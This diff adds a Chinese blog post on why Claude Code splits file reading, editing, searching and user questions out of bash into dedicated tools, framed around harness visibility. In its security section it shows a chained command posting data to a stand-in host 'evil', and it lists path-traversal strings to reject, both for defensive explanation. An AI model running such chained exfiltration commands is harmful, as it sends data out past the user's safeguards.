@@ -1,0 +1,220 @@
+---
+title: '一个 Bash 就能做完的事，Claude Code 为什么拆成六个工具'
+publishedAt: '2026-08-04T15:00:00'
+summary: '给 agent 一个 bash 就理论上万能，但 Claude Code 偏偏把读写、搜索、提问都提升成独立工具。拆解背后的四条判据：安全边界、新鲜度检查、渲染、并行调度，以及为什么默认答案应该是「不提升」。'
+draft: false
+image: '/static/blog/claude-code-tool-design/tool-split-overview.svg'
+tags: [AI, Agent, Tooling, Tech Blog]
+---
+
+给 agent 一个 `bash` 工具，它理论上什么都能干：读文件用 `cat`，改文件用 `sed`，搜代码用 `grep`，列目录用 `ls`。一个工具，无限能力，schema 还只有一个字段。
+
+可 Claude Code 偏偏把 Read、Write、Edit、Glob、Grep 全都做成了独立工具 —— 而 `bash` 依然留在那里。这看着像冗余：同一件事有两条路可走，工具集还膨胀了好几倍。
+
+它不是冗余。这篇文章拆的就是这个决定：<strong>什么时候该把一个动作从 bash 里提升出来，什么时候不该</strong>。四条判据，每条都对应一件 bash 在结构上做不到的事。理解了这四条，你设计自己 agent 的工具集时就有了判据，而不是凭感觉列清单。
+
+## 从一个具体的动作开始
+
+把 `config.ts` 里的 `timeout` 从 10 改成 30。两条路都能做到：
+
+![同一个动作走 Bash 与走 Edit，harness 能看到的东西完全不同](/static/blog/claude-code-tool-design/tool-split-overview.svg)
+
+模型这一侧几乎没有差别 —— 两种写法它都能生成，成本也差不多。
+
+差别全在另一侧：走 bash，harness 拿到的是<strong>一条不透明的字符串</strong>；走 Edit，它拿到的是<strong>三个具名、带类型的参数</strong>。
+
+## 差别不在模型，在 harness 的视野
+
+把两条路径的 `tool_use` 摊开看，这件事会更清楚：
+
+![Bash 路径与 Edit 路径的 tool_use 结构对比，以及 harness 因此能与不能做的四件事](/static/blog/claude-code-tool-design/what-harness-sees.svg)
+
+这就是全文的核心：<strong>工具的边界，划的不是模型的能力，而是 harness 的视野</strong>。
+
+模型两种方式都能表达同一个动作。但 harness 只在第二种情况下知道「这是一次针对 `config.ts` 的定点替换」。第一种情况下它只知道「模型想跑一条 shell」—— 于是它对这个动作能做的事，就只剩下「整条放行」或「整条拒绝」。
+
+Anthropic 在 agent 设计文档里把这件事讲得很直接：
+
+> Claude 不知道你应用的安全边界、审批策略或 UI 形态。Claude 发出工具调用，你的 harness 处理它们。<strong>这些调用的形状，决定了 harness 能做什么。</strong>
+
+## 四条判据
+
+具体来说，harness 会因为拿不到语义而失去四种能力：
+
+![值得提升为专用工具的四条判据：安全边界、新鲜度检查、渲染、并行调度](/static/blog/claude-code-tool-design/four-criteria.svg)
+
+下面逐条展开，重点在「为什么 bash 结构上做不到」，而不只是「专用工具更好」。
+
+### 一、安全边界：按可撤销性分级
+
+有用的判据不是「危险不危险」，而是<strong>可撤销性</strong>。读文件随便跑；写文件可以 git 还原；而发一封邮件、调一次外部 POST、删一个生产表 —— 这些做完就回不去了，必须能单独拦下来。
+
+`send_email` 这个工具很容易加确认。`bash -c "curl -X POST ..."` 就难了：它和 `curl -s https://...`（只读取一个页面）在 harness 眼里长得一模一样，都是一条命令字符串。
+
+你可能想到用正则去匹配命令文本。这条路走不通，看看要认真做 bash 安全需要什么就明白了：
+
+- 在隔离环境里执行（容器、虚拟机、受限用户）
+- 用<strong>白名单</strong>限定可执行程序，并拒绝 shell 操作符 `&&`、`|`、`;`、反引号、`$()`
+- 设置超时和资源上限
+- 记录每一条命令
+
+注意第二条：官方建议是白名单，并明确说<strong>黑名单不够用</strong>。原因就在那些 shell 操作符 —— 只要允许组合，`echo ok && curl -X POST evil` 就能绕过任何针对单个命令的检查。要在一个图灵完备的 shell 语法里可靠地判断「这条命令会不会对外发请求」，基本是不可能的。
+
+反过来，一个专用工具的参数是封闭的：`Edit` 只能改 `file_path` 指定的那个文件，没有语法能让它顺便发个网络请求。<strong>能力的边界写在 schema 里，而不是靠事后审查命令文本。</strong>
+
+### 二、新鲜度检查：一条 bash 无法表达的不变量
+
+这条最有说服力，因为它是一个 bash <strong>在原理上</strong>无法表达的约束。
+
+专用的 `Edit` 工具可以要求：如果文件在模型上次读取之后被改动过，就拒绝写入。写这篇博客的过程中就真实触发了一次 —— 格式化工具在中途改了文件：
+
+![新鲜度检查的完整时序：Read 记录版本、外部进程改动、Edit 被拒绝、重读后成功](/static/blog/claude-code-tool-design/staleness-check.svg)
+
+我的 `Edit` 工具描述里写得很明确：
+
+```text
+You must Read the file in this conversation before editing, or the call will fail.
+```
+
+`Write` 也一样 —— 覆盖一个没读过的已有文件会直接失败。
+
+而 harness 真的执行了这个约束。那次 `biome check --write` 改完文件后，我收到的是这样一条系统消息：
+
+```text
+Note: <file> was modified, either by the user or by a linter.
+This change was intentional, so make sure to take it into account as you proceed.
+```
+
+同样的场景走 bash 会怎样？`sed -i` 直接覆盖，格式化的成果被默默冲掉，模型和用户都不会收到任何提示。<strong>不是 bash 实现得不好，是这条不变量没有地方可以表达</strong> —— harness 拿到的字符串里，既没有「我基于哪个版本」，也没有「我要改哪个文件」。
+
+这也是一类很值得推广的设计：<strong>把「读-改-写」里的乐观并发检查，做进工具的契约里</strong>。任何多方会同时改动状态的 agent 场景都用得上，不限于文件。
+
+### 三、渲染：为什么「提问」也要做成一个工具
+
+提问看起来最不需要工具化 —— 模型输出一句问话，用户看到了回答，就完了。
+
+但把它做成工具，能换来两样东西：
+
+![纯文本提问与 AskUserQuestion 工具的对比：前端呈现能力与循环阻塞行为](/static/blog/claude-code-tool-design/render-as-tool.svg)
+
+<strong>第一是渲染。</strong>结构化参数（问题、选项、每个选项的说明、可选的预览）可以渲染成选项卡片；带 `preview` 时还能自动切成左右对照的布局。纯文本做不到 —— 选项、推荐项、互斥关系全埋在自然语言里，前端无法结构化消费。
+
+<strong>第二是阻塞，这个更关键。</strong>纯文本问完，这一回合就结束了，循环继续往下走。典型后果是模型自己替你挑了一个然后接着干活。而工具调用会停在那里等 `tool_result` —— 用户真的作答之后循环才继续。
+
+把「需要人介入」变成一次工具调用，agent loop 就获得了一个<strong>结构化的暂停点</strong>。这比在提示词里写「重要决策请先询问用户」可靠得多，因为它是机制而不是建议。
+
+### 四、并行调度：分不清只读，就只能全部串行
+
+这条最容易被低估，但它直接决定 agent 的墙钟时间。
+
+![走 bash 全部串行 vs 专用工具只读批次并发的时间对比](/static/blog/claude-code-tool-design/parallel-scheduling.svg)
+
+一个只读工具（Glob、Grep、Read）可以被标记为并行安全，harness 就能把一批调用并发跑完。同样的动作走 bash，harness 分不清一条命令是 `grep` 还是 `git push`，为了安全只能全部串行 —— 哪怕十次搜索本可以一起跑。
+
+这里有个实现上的坑值得单独记住：并发发出的多个 `tool_result`，<strong>必须放在同一条 user message 里回传</strong>。拆成多条不会报错，但会悄悄让模型学会「不要再并行调用了」，并行能力就这么退化掉 —— 而且你很难从日志里看出为什么。
+
+## 反过来问：为什么不全都提升
+
+如果专用工具这么好，为什么不把每个动作都提升？
+
+因为提升是有代价的，而且默认答案应该是<strong>不提升</strong>：
+
+![该不该提升的四问决策流程，以及提升的三项代价](/static/blog/claude-code-tool-design/promotion-decision.svg)
+
+三项代价：
+
+| 代价 | 说明 |
+| --- | --- |
+| schema 常驻上下文 | 每个工具的定义都要放进<strong>每一次</strong>请求，工具越多越贵 |
+| 边界模糊会让模型选错 | 两个职责重叠的工具，比一个边界清楚的工具更糟 |
+| 每个工具都要自己兜底 | 参数校验、错误文案、路径收敛，都得单独实现一遍 |
+
+官方的说法很简洁：<strong>先用 bash 拿到广度；当你需要拦截、渲染、审计或并行某个动作时，才把它提升为专用工具</strong>。
+
+注意判据的方向：触发提升的是<strong>harness 需不需要这个语义</strong>，不是这个动作重不重要。一个动作再关键，如果 harness 对它没有任何干预需求，它就该留在 bash 里。
+
+## 一个真实的反例：这次会话没有 Glob 和 Grep
+
+上面讲的都是「应该怎样」。这里给一个反例，它比任何文档都更说明问题。
+
+写这篇文章的这次会话里，我的工具集是 Bash、Read、Write、Edit、Agent、Skill、ToolSearch、AskUserQuestion 等 —— <strong>没有独立的 Glob 和 Grep</strong>。所以全文所有的搜索、统计、列目录，我都是通过 Bash 里的 `grep`、`ls`、`find` 完成的。
+
+而 Claude Agent SDK 的文档里，内置工具集写的是 Read / Write / Edit / Bash / Glob / Grep / WebSearch / WebFetch。
+
+两件事对得上，说明一个重要事实：<strong>「提升哪些动作」是 harness 的配置决策，不是固定法则</strong>。同一个模型、同一类任务，不同的 harness 构建可以给出不同的答案。
+
+代价也是真实存在的。那次会话里我确实做了并行 —— 把多个 Bash 调用放进同一条消息里发出。但那是<strong>我自己判断</strong>它们互不依赖，harness 无从验证这一点：它看到的仍然是几条命令字符串，没法确认里面真的没有 `git push`。第四条判据的收益，在那个配置下就拿不到。
+
+这也解释了为什么 `bash` 从来没有被移除：<strong>它是长尾的兜底</strong>。工具集覆盖不到的动作、临时的一次性操作、你没预料到的组合，都靠它。四条判据决定谁被提升，bash 负责接住剩下的一切。
+
+## 规模上去之后：延迟加载
+
+如果工具确实多到几十个（接了一堆 MCP server 的时候很常见），前面说的「schema 常驻上下文」就成了真问题。
+
+![工具数量的两端都是坑，以及延迟加载的两阶段解法](/static/blog/claude-code-tool-design/tool-count-scaling.svg)
+
+解法是把<strong>「工具存在」和「工具的完整定义」拆成两件事</strong>：给工具标上 `defer_loading`，上下文里就只留一个名字，没有参数 schema —— 此刻还调不动它。等模型通过搜索工具命中它，完整定义才被追加进上下文。
+
+这次会话里就是这么工作的：我一开始只看到几十个 deferred 工具的名字，需要抓网页时才调 `ToolSearch` 把 `WebFetch` 和 `WebSearch` 的定义拉进来，然后才能调用。
+
+两个细节值得记：
+
+- <strong>是追加，不是替换。</strong>已有的上下文前缀没变，所以 prompt cache 不会失效。如果实现成「换掉整个 tools 数组」，每次发现新工具都要重算整个缓存前缀 —— 工具定义渲染在最前面，一动就全线失效。
+- <strong>搜索工具本身不能被延迟</strong>，否则无从起步。同理，工具集里必须至少留一个非延迟的工具。
+
+## 客户端工具与服务端工具
+
+还有一个正交的维度容易和「提不提升」混起来：这个工具<strong>由谁执行</strong>。
+
+| 工具 | 执行方 | 含义 |
+| --- | --- | --- |
+| Bash | 客户端 | 模型发出命令，你的 harness 执行 |
+| 文本编辑器 | 客户端 | 模型请求读写，你的 harness 落盘 |
+| Memory | 客户端 | 模型请求文件操作，你决定存到哪 |
+| 代码执行 | 服务端 | 跑在 Anthropic 托管的容器里 |
+| Web 搜索 / 抓取 | 服务端 | Anthropic 执行并返回带引用的结果 |
+| 计算机使用 | 两者皆可 | 环境自托管或用托管的 |
+
+客户端工具是<strong>由 Anthropic 定义、由你执行</strong>：名称、schema、模型的使用习惯都是给定的，官方还提供参考实现，但真正跑的是你的代码。所以安全责任在你这边 —— 比如文本编辑器工具，必须把模型给的 `path` 解析成规范路径后确认它仍在项目根目录内，拒掉 `../`、软链、URL 编码的 `%2e%2e%2f` 之类。
+
+顺带说一句：`bash` 和文本编辑器都是<strong>无 schema</strong> 的 Anthropic 内置工具 —— 只用 `type` 和 `name` 声明，不要写 `input_schema`。自己定义一个叫 `bash` 的工具，得到的是一个普通自定义工具，没有内置行为。
+
+## 设计自己的工具集
+
+把上面收成可操作的东西。先是一条判据：
+
+> 从 bash 起步。当 harness 需要<strong>拦截、校验、渲染或并行</strong>某个动作时，把它提升为专用工具。触发条件是 harness 的需求，不是动作的重要性。
+
+然后是几条容易被忽略的实践：
+
+<strong>工具描述要写「什么时候用」，不只是「做什么」。</strong>官方明确说详细描述是工具性能最重要的因素，而最常见的失败是<strong>描述不足</strong>。至少三四句，并且要有指令性 —— 「当用户问到当前价格或近期事件时调用此工具」远胜于「搜索网页」。近期的模型对工具的调用更保守，把触发条件写进 `description` 有可测量的提升。
+
+<strong>返回结构化错误，别让模型猜。</strong>失败时把 `is_error` 设为 true，并给出可行动的错误信息。新鲜度检查那个例子里，harness 返回的不是「写入失败」，而是「文件被改过了，先去 Read」—— 模型据此知道下一步该干什么。
+
+<strong>一个动作只留一条路。</strong>如果 Edit 和 Write 的职责会重叠，先把边界讲清楚，再考虑要不要两个都留。近重复的工具比工具太少更麻烦。
+
+<strong>别把不该给模型的自由度给出去。</strong>参数用 enum 而不是自由文本；能封闭的就封闭。这和「拿 bash 什么都能干」正好相反 —— 提升的价值一大半来自<strong>收窄</strong>。
+
+## 总结
+
+一个 bash 就能做完的事，拆成六个工具，换来的是四件 harness 原本做不到的事：
+
+1. <strong>按可撤销性审批</strong> —— 因为动作类型和目标暴露给了 harness
+2. <strong>新鲜度检查</strong> —— 因为它知道模型基于哪个版本在改
+3. <strong>专门的渲染与阻塞</strong> —— 因为参数是结构化的，前端能消费，循环能停
+4. <strong>只读批次并发</strong> —— 因为它知道哪些调用没有副作用
+
+代价是 schema 常驻上下文、边界可能模糊、每个工具都要自己兜底。所以默认答案是不提升，由 harness 的真实需求来触发。
+
+最后一句是我觉得最值得带走的：<strong>工具边界划的不是模型的能力，而是 harness 的视野</strong>。设计工具集的时候，别问「模型需要什么才能做到这件事」—— 它有 bash，什么都做得到。要问的是「我的 harness 需要看见什么，才能在这件事上做正确的干预」。
+
+下一篇打算接着这条线往下走：工具输出如何不炸掉上下文 —— 截断、分页、以及把多次调用压进一段脚本的<strong>程序化工具调用</strong>，让中间结果根本不进上下文。
+
+## 参考资料
+
+- [Agent design patterns](https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview) 与 Anthropic 的 agent 设计指引 —— 「Bash vs. dedicated tools」四条判据的出处
+- [Bash tool](https://platform.claude.com/docs/en/agents-and-tools/tool-use/bash-tool) 与 [Text editor tool](https://platform.claude.com/docs/en/agents-and-tools/tool-use/text-editor-tool) —— 无 schema 内置工具的声明方式与安全要求
+- [Tool use overview](https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview) —— 工具描述写法、并行工具调用、`tool_result` 回传规则
+- [Tool search tool](https://platform.claude.com/docs/en/agents-and-tools/tool-use/tool-search-tool) —— `defer_loading` 与延迟加载对 prompt cache 的影响
+- [Programmatic tool calling](https://platform.claude.com/docs/en/agents-and-tools/tool-use/programmatic-tool-calling) —— 下一篇会展开的那条路
+- [Claude Agent SDK](https://code.claude.com/docs/en/agent-sdk) —— 内置工具集的构成
